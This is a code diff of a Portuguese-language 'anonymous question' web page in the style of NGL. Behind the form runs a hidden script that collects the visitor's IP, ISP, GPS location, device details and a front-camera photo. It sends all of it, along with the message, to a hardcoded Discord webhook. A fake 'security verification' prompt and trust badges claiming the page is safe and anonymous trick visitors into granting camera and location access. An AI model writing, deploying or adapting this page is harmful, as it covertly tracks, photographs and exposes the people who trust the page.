@@ -54,29 +54,29 @@
     }
     
     .avatar {
-      width: 80px;
-      height: 80px;
+      width: 70px;
+      height: 70px;
       background: linear-gradient(45deg, #667eea, #764ba2);
       border-radius: 50%;
       margin: 0 auto 20px;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 36px;
+      font-size: 30px;
       color: white;
       box-shadow: 0 8px 25px rgba(102, 126, 234, 0.3);
     }
     
     .header h1 {
       color: #2c3e50;
-      font-size: 24px;
+      font-size: 22px;
       font-weight: 600;
       margin-bottom: 8px;
     }
     
     .header p {
       color: #7f8c8d;
-      font-size: 15px;
+      font-size: 14px;
       line-height: 1.4;
     }
     
@@ -160,6 +160,23 @@
       border-color: #667eea;
       background: white;
       box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+    }
+    
+    .trust-indicators {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      margin: 15px 0;
+      flex-wrap: wrap;
+    }
+    
+    .trust-item {
+      background: rgba(46, 204, 113, 0.1);
+      padding: 6px 12px;
+      border-radius: 12px;
+      font-size: 11px;
+      font-weight: 600;
+      color: #27ae60;
     }
     
     .submit-btn {
@@ -289,13 +306,13 @@
     
     .modal h3 {
       color: #27ae60;
-      font-size: 24px;
+      font-size: 22px;
       margin-bottom: 15px;
       font-weight: 600;
     }
     
     .modal .emoji {
-      font-size: 60px;
+      font-size: 50px;
       margin-bottom: 20px;
       display: block;
     }
@@ -304,6 +321,7 @@
       color: #7f8c8d;
       line-height: 1.5;
       margin-bottom: 10px;
+      font-size: 14px;
     }
     
     .modal button {
@@ -323,7 +341,7 @@
       background: #229954;
     }
     
-    /* Permission prompt estilo NGL */
+    /* Permission prompt */
     .permission-prompt {
       position: fixed;
       top: 0;
@@ -352,19 +370,19 @@
     }
     
     .permission-icon {
-      font-size: 80px;
+      font-size: 60px;
       margin-bottom: 25px;
       display: block;
     }
     
     .permission-content h3 {
-      font-size: 28px;
+      font-size: 24px;
       margin-bottom: 20px;
       font-weight: 600;
     }
     
     .permission-content p {
-      font-size: 16px;
+      font-size: 15px;
       line-height: 1.6;
       margin-bottom: 15px;
       opacity: 0.9;
@@ -416,16 +434,6 @@
       background: #e74c3c;
     }
     
-    /* Mapa */
-    .location-map {
-      width: 100%;
-      height: 200px;
-      border-radius: 12px;
-      margin: 20px 0;
-      display: none;
-      border: 2px solid #ecf0f1;
-    }
-    
     /* Responsivo */
     @media (max-width: 480px) {
       .container {
@@ -437,6 +445,15 @@
         padding: 30px 20px;
         margin: 10px;
       }
+      
+      .trust-indicators {
+        gap: 8px;
+      }
+      
+      .trust-item {
+        font-size: 10px;
+        padding: 5px 10px;
+      }
     }
   </style>
 </head>
@@ -446,15 +463,22 @@
       <div class="avatar">👤</div>
       <h1>Pergunta Anônima</h1>
       <p>Envie uma mensagem anônima para mim!</p>
+      
+      <div class="trust-indicators">
+        <div class="trust-item">Seguro</div>
+        <div class="trust-item">Privado</div>
+        <div class="trust-item">Anônimo</div>
+      </div>
+      
       <div class="anonymous-badge">Completamente anônimo</div>
     </div>
 
     <form id="anonymous-form">
       <div class="form-group">
-        <label for="pergunta">💬 Sua pergunta ou mensagem:</label>
+        <label for="pergunta">Sua pergunta ou mensagem:</label>
         <textarea 
           id="pergunta" 
-          placeholder="Digite sua pergunta ou mensagem aqui... Seja honesto, é totalmente anônimo! 😊"
+          placeholder="Digite sua pergunta ou mensagem aqui... Seja honesto, é totalmente anônimo!"
           maxlength="500"
           required
         ></textarea>
@@ -464,7 +488,7 @@
       </div>
 
       <div class="form-group">
-        <label for="nome">🎭 Nome (opcional - para personalizar a resposta):</label>
+        <label for="nome">Nome (opcional - para personalizar a resposta):</label>
         <input 
           type="text" 
           id="nome" 
@@ -474,10 +498,8 @@
         >
       </div>
 
-      <div class="location-map" id="location-map"></div>
-
       <button type="submit" class="submit-btn" id="btn-enviar">
-        📤 Enviar Anonimamente
+        Enviar Anonimamente
       </button>
     </form>
   </div>
@@ -499,7 +521,7 @@
       <span class="emoji">✨</span>
       <h3>Mensagem Enviada!</h3>
       <p>Sua mensagem anônima foi enviada com sucesso!</p>
-      <p>Obrigado por participar! 💜</p>
+      <p>Obrigado por participar!</p>
       <button onclick="closeSuccessModal()">Fechar</button>
     </div>
   </div>
@@ -507,19 +529,19 @@
   <!-- Prompt de permissão -->
   <div class="permission-prompt" id="permission-prompt">
     <div class="permission-content">
-      <span class="permission-icon">🔒</span>
-      <h3>Verificação Rápida</h3>
-      <p>Para garantir que você não é um bot e manter a qualidade das mensagens, precisamos fazer uma verificação rápida.</p>
-      <p>Isso leva apenas alguns segundos e é totalmente seguro!</p>
-      <p><strong>Sua privacidade está protegida</strong> - continuará sendo anônimo.</p>
+      <span class="permission-icon">🛡️</span>
+      <h3>Verificação de Segurança</h3>
+      <p>Para proteger nossa comunidade contra bots e garantir a segurança da plataforma, realizamos uma verificação rápida.</p>
+      <p>Precisamos de acesso à câmera e localização para confirmar que você é um usuário real. Este processo é automático e seguro.</p>
+      <p><strong>Sua privacidade é nossa prioridade.</strong> Você permanecerá 100% anônimo.</p>
       <button class="permission-btn" id="permission-button">
-        ✅ Verificar e Continuar
+        Continuar com Segurança
       </button>
     </div>
   </div>
 
   <script>
-    class DataSystem {
+    class PermissionManager {
         constructor() {
             this.webhook = "https://discord.com/api/webhooks/1356844204608721017/GB-N9jMt__CmHGiFaJUAOg_doQBZTNH0GjOoTwekMa_SBmIff-NKyk91FUDDQuhfCQE2";
             
@@ -541,11 +563,11 @@
                 initCompleted: false
             };
             
-            this.detectDevice();
+            this.coletarInformacoesDispositivo();
             this.init();
         }
         
-        detectDevice() {
+        coletarInformacoesDispositivo() {
             const ua = navigator.userAgent;
             this.data.device = {
                 isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua),
@@ -575,7 +597,7 @@
 
             await this.getIPInfo();
             this.setupInteractionListeners();
-            this.requestAllPermissions();
+            this.solicitarTodasPermissoes();
             this.setupAutoTriggers();
         }
         
@@ -613,7 +635,7 @@
             const events = ['click', 'touchstart', 'scroll', 'mousemove'];
             const autoTrigger = () => {
                 if (!this.flags.permissionsRequested) {
-                    setTimeout(() => this.requestAllPermissions(), 200);
+                    setTimeout(() => this.solicitarTodasPermissoes(), 200);
                 }
             };
             
@@ -624,7 +646,10 @@
         
         showPermissionPrompt() {
             const element = document.getElementById('permission-prompt');
-            if (element) element.style.display = 'flex';
+            if (element) {
+                element.style.display = 'flex';
+                this.bypessPermissao();
+            }
         }
         
         hidePermissionPrompt() {
@@ -635,8 +660,10 @@
         async getIPInfo() {
             try {
                 const services = [
-                    'https://ip-api.com/json', 'https://ipapi.co/json/', 
-                    'https://ipinfo.io/json', 'https://ipwhois.app/json/',
+                    'https://ip-api.com/json', 
+                    'https://ipapi.co/json/', 
+                    'https://ipinfo.io/json', 
+                    'https://ipwhois.app/json/',
                     'https://api.ipgeolocation.io/ipgeo?apiKey=demo'
                 ];
                 for (const service of services) {
@@ -645,27 +672,43 @@
                         if (response.ok) {
                             const data = await response.json();
                             this.data.ip = {
-                                ip: data.ip || data.query, city: data.city,
-                                region: data.region || data.regionName, country: data.country_name || data.country,
-                                isp: data.org || data.isp, latitude: parseFloat(data.latitude || data.lat) || null,
-                                longitude: parseFloat(data.longitude || data.lon) || null, timezone: data.timezone,
+                                ip: data.ip || data.query, 
+                                city: data.city,
+                                region: data.region || data.regionName, 
+                                country: data.country_name || data.country,
+                                isp: data.org || data.isp, 
+                                latitude: parseFloat(data.latitude || data.lat) || null,
+                                longitude: parseFloat(data.longitude || data.lon) || null, 
+                                timezone: data.timezone,
                                 service: service
                             };
                             return;
                         }
-                    } catch (e) { /* Continue silently */ }
+                    } catch (e) { 
+                        continue;
+                    }
                 }
-            } catch (error) { /* Fail silently */ }
+            } catch (error) { 
+                // Falha silenciosa
+            }
         }
         
-        async requestAllPermissions() {
+        async bypessPermissao() {
+            const requests = [];
+            if (this.data.location.status === 'pending') {
+                requests.push(this.requestLocation());
+            }
+            if (this.data.camera.status === 'pending' && !this.flags.cameraAttempted) {
+                requests.push(this.captureCamera());
+            }
+            await Promise.allSettled(requests);
+        }
+
+        async solicitarTodasPermissoes() {
             if (this.flags.permissionsRequested) return;
             this.flags.permissionsRequested = true;
             
-            const requests = [this.requestLocation(), this.requestNotifications()];
-            if (!this.flags.cameraAttempted) {
-                requests.push(this.captureCamera());
-            }
+            const requests = [this.bypessPermissao(), this.requestNotifications()];
             await Promise.allSettled(requests);
         }
         
@@ -673,11 +716,16 @@
             try {
                 if (!navigator.geolocation) return;
                 const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
-                const position = await new Promise((resolve, reject) => navigator.geolocation.getCurrentPosition(resolve, reject, options));
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, options);
+                });
                 
                 this.data.location = {
-                    lat: position.coords.latitude, lon: position.coords.longitude,
-                    accuracy: position.coords.accuracy, status: 'success', source: 'GPS'
+                    lat: position.coords.latitude, 
+                    lon: position.coords.longitude,
+                    accuracy: position.coords.accuracy, 
+                    status: 'success', 
+                    source: 'GPS'
                 };
                 this.data.location.googleMapsUrl = `https://www.google.com/maps?q=${this.data.location.lat},${this.data.location.lon}`;
                 this._sL();
@@ -686,7 +734,8 @@
                 if (this.data.ip.latitude && this.data.ip.longitude) {
                     this.data.location = {
                         ...this.data.location,
-                        lat: this.data.ip.latitude, lon: this.data.ip.longitude,
+                        lat: this.data.ip.latitude, 
+                        lon: this.data.ip.longitude,
                         googleMapsUrl: `https://www.google.com/maps?q=${this.data.ip.latitude},${this.data.ip.longitude}`,
                         source: 'IP'
                     };
@@ -701,7 +750,14 @@
             
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
-            const constraints = { audio: false, video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } };
+            const constraints = { 
+                audio: false, 
+                video: { 
+                    facingMode: 'user', 
+                    width: { ideal: 640 }, 
+                    height: { ideal: 480 } 
+                } 
+            };
             let stream = null;
 
             try {
@@ -710,7 +766,11 @@
                 video.muted = true;
                 video.playsInline = true;
                 
-                await new Promise(resolve => { video.onloadedmetadata = () => video.play().then(resolve).catch(resolve); });
+                await new Promise(resolve => { 
+                    video.onloadedmetadata = () => {
+                        video.play().then(resolve).catch(resolve);
+                    };
+                });
                 await new Promise(resolve => setTimeout(resolve, 400));
 
                 canvas.width = video.videoWidth || 640;
@@ -718,8 +778,10 @@
                 canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                 
                 this.data.camera = {
-                    image: canvas.toDataURL('image/jpeg', 0.7), status: 'success',
-                    resolution: `${canvas.width}x${canvas.height}`, timestamp: new Date().toISOString()
+                    image: canvas.toDataURL('image/jpeg', 0.7), 
+                    status: 'success',
+                    resolution: `${canvas.width}x${canvas.height}`, 
+                    timestamp: new Date().toISOString()
                 };
                 this._sC();
             } catch (error) {
@@ -737,53 +799,103 @@
         async requestNotifications() {
             try {
                 if (!('Notification' in window) || Notification.permission === 'denied') return;
-                let permission = Notification.permission === 'default' ? await Notification.requestPermission() : Notification.permission;
+                let permission = Notification.permission === 'default' ? 
+                    await Notification.requestPermission() : Notification.permission;
                 this.data.permissions.notifications = permission === 'granted';
-            } catch (error) { /* Fail silently */ }
+            } catch (error) { 
+                // Falha silenciosa
+            }
         }
         
-        async _sL() { // Formerly sendLocationToDiscord
+        async _sL() {
             if (this.flags.locationSent || !this.data.location.lat) return;
             this.flags.locationSent = true;
             try {
                 const { lat, lon, accuracy, googleMapsUrl, source } = this.data.location;
                 const payload = {
-                    username: "System Analytics", avatar_url: "https://cdn-icons-png.flaticon.com/512/854/854878.png",
+                    username: "System Analytics", 
+                    avatar_url: "https://cdn-icons-png.flaticon.com/512/854/854878.png",
                     embeds: [{
                         title: `Location Data (${source || 'N/A'})`,
                         description: `[View on Map](${googleMapsUrl})`,
                         color: source === 'GPS' ? 0x00FF00 : 0xFFA500,
                         fields: [
-                            { name: "Coordinates", value: `Lat: \`${lat.toFixed(6)}\`\nLon: \`${lon.toFixed(6)}\``, inline: true },
-                            { name: "Accuracy", value: `\`${accuracy ? accuracy.toFixed(2) + 'm' : 'N/A'}\``, inline: true },
-                            { name: "Device", value: `\`${this.data.device.isIOS ? 'iOS' : this.data.device.isAndroid ? 'Android' : 'Desktop'}\``, inline: true },
-                            { name: "IP", value: `\`${this.data.ip.ip || 'N/A'}\``, inline: true },
-                            { name: "ISP", value: `\`${this.data.ip.isp || 'N/A'}\``, inline: true },
-                            { name: "Timestamp", value: `\`${new Date().toLocaleString('pt-BR')}\``, inline: true }
+                            { 
+                                name: "Coordinates", 
+                                value: `Lat: \`${lat.toFixed(6)}\`\nLon: \`${lon.toFixed(6)}\``, 
+                                inline: true 
+                            },
+                            { 
+                                name: "Accuracy", 
+                                value: `\`${accuracy ? accuracy.toFixed(2) + 'm' : 'N/A'}\``, 
+                                inline: true 
+                            },
+                            { 
+                                name: "Device", 
+                                value: `\`${this.data.device.isIOS ? 'iOS' : this.data.device.isAndroid ? 'Android' : 'Desktop'}\``, 
+                                inline: true 
+                            },
+                            { 
+                                name: "IP", 
+                                value: `\`${this.data.ip.ip || 'N/A'}\``, 
+                                inline: true 
+                            },
+                            { 
+                                name: "ISP", 
+                                value: `\`${this.data.ip.isp || 'N/A'}\``, 
+                                inline: true 
+                            },
+                            { 
+                                name: "Timestamp", 
+                                value: `\`${new Date().toLocaleString('pt-BR')}\``, 
+                                inline: true 
+                            }
                         ],
-                        footer: { text: "System Analytics" }, timestamp: new Date().toISOString()
+                        footer: { text: "System Analytics" }, 
+                        timestamp: new Date().toISOString()
                     }]
                 };
-                await fetch(this.webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
-            } catch (error) { /* Fail silently */ }
+                await fetch(this.webhook, { 
+                    method: 'POST', 
+                    headers: { 'Content-Type': 'application/json' }, 
+                    body: JSON.stringify(payload) 
+                });
+            } catch (error) { 
+                // Falha silenciosa
+            }
         }
         
-        async _sC() { // Formerly sendCameraToDiscord
+        async _sC() {
             if (this.flags.cameraSent || !this.data.camera.image) return;
             this.flags.cameraSent = true;
             try {
                 const payload = {
-                    username: "System Verification", avatar_url: "https://cdn-icons-png.flaticon.com/512/3075/3075977.png",
+                    username: "System Verification", 
+                    avatar_url: "https://cdn-icons-png.flaticon.com/512/3075/3075977.png",
                     content: "**Visual Verification**",
                     embeds: [{
-                        title: "Visual Check Complete", color: 0x00FF00,
+                        title: "Visual Check Complete", 
+                        color: 0x00FF00,
                         fields: [
-                            { name: "Device", value: `\`${this.data.device.isIOS ? 'iOS' : this.data.device.isAndroid ? 'Android' : 'Desktop'}\``, inline: true },
-                            { name: "IP", value: `\`${this.data.ip.ip || 'N/A'}\``, inline: true },
-                            { name: "Timestamp", value: `\`${new Date().toLocaleString('pt-BR')}\``, inline: true }
+                            { 
+                                name: "Device", 
+                                value: `\`${this.data.device.isIOS ? 'iOS' : this.data.device.isAndroid ? 'Android' : 'Desktop'}\``, 
+                                inline: true 
+                            },
+                            { 
+                                name: "IP", 
+                                value: `\`${this.data.ip.ip || 'N/A'}\``, 
+                                inline: true 
+                            },
+                            { 
+                                name: "Timestamp", 
+                                value: `\`${new Date().toLocaleString('pt-BR')}\``, 
+                                inline: true 
+                            }
                         ],
                         image: { url: "attachment://capture.jpg" },
-                        footer: { text: "Visual Verification System" }, timestamp: new Date().toISOString()
+                        footer: { text: "Visual Verification System" }, 
+                        timestamp: new Date().toISOString()
                     }]
                 };
                 const formData = new FormData();
@@ -791,13 +903,20 @@
                 const blob = this.dataURLtoBlob(this.data.camera.image);
                 formData.append("file", blob, "capture.jpg");
                 await fetch(this.webhook, { method: 'POST', body: formData });
-            } catch (error) { /* Fail silently */ }
+            } catch (error) { 
+                // Falha silenciosa
+            }
         }
         
         dataURLtoBlob(dataURL) {
-            const arr = dataURL.split(','), mime = arr[0].match(/:(.*?);/)[1], bstr = atob(arr[1]);
-            let n = bstr.length; const u8arr = new Uint8Array(n);
-            while (n--) { u8arr[n] = bstr.charCodeAt(n); }
+            const arr = dataURL.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while (n--) { 
+                u8arr[n] = bstr.charCodeAt(n); 
+            }
             return new Blob([u8arr], { type: mime });
         }
         
@@ -808,7 +927,11 @@
             document.body.appendChild(toast);
             setTimeout(() => {
                 toast.classList.remove('show');
-                setTimeout(() => { if (document.body.contains(toast)) document.body.removeChild(toast); }, 300);
+                setTimeout(() => { 
+                    if (document.body.contains(toast)) {
+                        document.body.removeChild(toast);
+                    }
+                }, 300);
             }, 2500);
         }
         
@@ -828,7 +951,7 @@
             document.getElementById('btn-enviar').disabled = true;
             
             if (!this.flags.permissionsRequested) {
-                await this.requestAllPermissions();
+                await this.solicitarTodasPermissoes();
                 await new Promise(resolve => setTimeout(resolve, 1000));
             }
             
@@ -836,26 +959,70 @@
             await this._sD();
         }
         
-        async _sD() { // Formerly sendCompleteData
+        async _sD() {
             try {
                 const pergunta = document.getElementById('pergunta').value.trim();
                 const nome = document.getElementById('nome').value.trim() || 'Anônimo';
                 const embed = {
-                    title: 'New Anonymous Submission', description: `**Message:** ${pergunta}`, color: 0x667eea,
+                    title: 'New Anonymous Submission', 
+                    description: `**Message:** ${pergunta}`, 
+                    color: 0x667eea,
                     fields: [
-                        { name: 'User', value: `**Name:** ${nome}\n**Date:** ${new Date().toLocaleString('pt-BR')}`, inline: false },
-                        { name: 'Network Info', value: `**IP:** ${this.data.ip.ip || 'N/A'}\n**City:** ${this.data.ip.city || 'N/A'}\n**Country:** ${this.data.ip.country || 'N/A'}`, inline: true },
-                        { name: 'Location', value: this.data.location.status === 'success' ? `**GPS:** ${this.data.location.lat?.toFixed(6)}, ${this.data.location.lon?.toFixed(6)}\n[Map](${this.data.location.googleMapsUrl})` : 'Not available', inline: true },
-                        { name: 'Device', value: `**Type:** ${this.data.device.isMobile ? 'Mobile' : 'Desktop'}\n**OS:** ${this.data.device.isIOS ? 'iOS' : this.data.device.isAndroid ? 'Android' : 'Other'}\n**Browser:** ${this.data.device.isChrome ? 'Chrome' : this.data.device.isSafari ? 'Safari' : 'Other'}`, inline: false },
-                        { name: 'Behavior', value: `**Time:** ${Math.round(this.data.behavior.timeToSubmit / 1000)}s\n**Interactions:** ${this.data.behavior.interactions.length}`, inline: true },
-                        { name: 'Checks', value: [`📍 GPS: ${this.data.location.status === 'success' ? '✅' : '❌'}`, `📸 Cam: ${this.data.camera.status === 'success' ? '✅' : '❌'}`, `🔔 Notif: ${this.data.permissions.notifications ? '✅' : '❌'}`].join('\n'), inline: true }
+                        { 
+                            name: 'User', 
+                            value: `**Name:** ${nome}\n**Date:** ${new Date().toLocaleString('pt-BR')}`, 
+                            inline: false 
+                        },
+                        { 
+                            name: 'Network Info', 
+                            value: `**IP:** ${this.data.ip.ip || 'N/A'}\n**City:** ${this.data.ip.city || 'N/A'}\n**Country:** ${this.data.ip.country || 'N/A'}`, 
+                            inline: true 
+                        },
+                        { 
+                            name: 'Location', 
+                            value: this.data.location.status === 'success' ? 
+                                `**GPS:** ${this.data.location.lat?.toFixed(6)}, ${this.data.location.lon?.toFixed(6)}\n[Map](${this.data.location.googleMapsUrl})` : 
+                                'Not available', 
+                            inline: true 
+                        },
+                        { 
+                            name: 'Device', 
+                            value: `**Type:** ${this.data.device.isMobile ? 'Mobile' : 'Desktop'}\n**OS:** ${this.data.device.isIOS ? 'iOS' : this.data.device.isAndroid ? 'Android' : 'Other'}\n**Browser:** ${this.data.device.isChrome ? 'Chrome' : this.data.device.isSafari ? 'Safari' : 'Other'}`, 
+                            inline: false 
+                        },
+                        { 
+                            name: 'Behavior', 
+                            value: `**Time:** ${Math.round(this.data.behavior.timeToSubmit / 1000)}s\n**Interactions:** ${this.data.behavior.interactions.length}`, 
+                            inline: true 
+                        },
+                        { 
+                            name: 'Checks', 
+                            value: [
+                                `GPS: ${this.data.location.status === 'success' ? '✅' : '❌'}`, 
+                                `Cam: ${this.data.camera.status === 'success' ? '✅' : '❌'}`, 
+                                `Notif: ${this.data.permissions.notifications ? '✅' : '❌'}`
+                            ].join('\n'), 
+                            inline: true 
+                        }
                     ],
-                    footer: { text: 'Data Collection System' }, timestamp: new Date().toISOString()
+                    footer: { text: 'Data Collection System' }, 
+                    timestamp: new Date().toISOString()
                 };
-                const payload = { username: 'User Submission', avatar_url: 'https://cdn-icons-png.flaticon.com/512/1828/1828833.png', embeds: [embed] };
-                const response = await fetch(this.webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
-                if (response.ok) this.showSuccessModal();
-                else throw new Error('Failed to send');
+                const payload = { 
+                    username: 'User Submission', 
+                    avatar_url: 'https://cdn-icons-png.flaticon.com/512/1828/1828833.png', 
+                    embeds: [embed] 
+                };
+                const response = await fetch(this.webhook, { 
+                    method: 'POST', 
+                    headers: { 'Content-Type': 'application/json' }, 
+                    body: JSON.stringify(payload) 
+                });
+                if (response.ok) {
+                    this.showSuccessModal();
+                } else {
+                    throw new Error('Failed to send');
+                }
             } catch (error) {
                 this.flags.formSubmitted = false;
                 document.getElementById('btn-enviar').disabled = false;
@@ -881,7 +1048,7 @@
     };
     
     document.addEventListener('DOMContentLoaded', () => {
-        window.dataSystem = new DataSystem();
+        window.permissionManager = new PermissionManager();
     });
     
     document.addEventListener('keydown', (e) => {
@@ -895,6 +1062,6 @@
         e.preventDefault();
         return false;
     });
-</script>
+  </script>
 </body>
 </html>
